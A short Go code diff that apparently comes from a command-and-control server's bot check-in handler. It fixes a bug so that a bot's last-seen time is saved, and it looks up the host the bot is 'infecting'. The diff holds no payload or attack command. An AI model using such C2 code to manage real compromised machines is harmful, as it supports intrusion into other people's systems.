@@ -224,7 +224,7 @@ func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
 	if err != nil {
 		return 400, actList // unknown bot
 	}
-	botObj.Update().SetLastSeen(checkTime)
+	botObj.Update().SetLastSeen(checkTime).Save(ctx)
 	hostObj, err := botObj.QueryInfecting().Only(ctx)
 	if err != nil {
 		return 400, actList // bot assoc w/ unknown host
